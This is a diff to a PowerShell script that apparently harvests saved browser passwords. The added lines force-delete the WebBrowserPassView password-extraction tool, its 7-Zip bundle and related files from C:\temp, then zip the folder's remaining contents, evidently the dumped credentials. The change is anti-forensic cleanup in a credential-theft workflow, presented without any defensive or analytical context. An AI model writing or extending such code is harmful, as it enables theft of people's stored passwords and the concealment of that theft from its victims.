@@ -105,11 +105,22 @@ $zipFilePath = Join-Path -Path "C:\temp" -ChildPath $zipFileName
 # Function to create a zip archive using Compress-Archive
 function ZipFiles {
 
+    # removing useless files
+    Remove-Item -Path "C:\temp\7z.zip" -Force
+    Remove-Item -Path "C:\temp\7z" -Recurse -Force
+    Remove-Item -Path "C:\temp\readme.txt" -Force
+    Remove-Item -Path "C:\temp\wbpv.zip" -Force
+    Remove-Item -Path "C:\temp\WebBrowserPassView.cgf" -Force
+    Remove-Item -Path "C:\temp\WebBrowserPassView.chm" -Force
+    Remove-Item -Path "C:\temp\WebBrowserPassView.exe" -Force
+    
     # Specify the source directory
     $sourceDirectory = "C:\temp"
 
     # Compress the contents of the source directory to a zip file
     Compress-Archive -Path $sourceDirectory -DestinationPath $zipFilePath
+
+    
 
 }
 
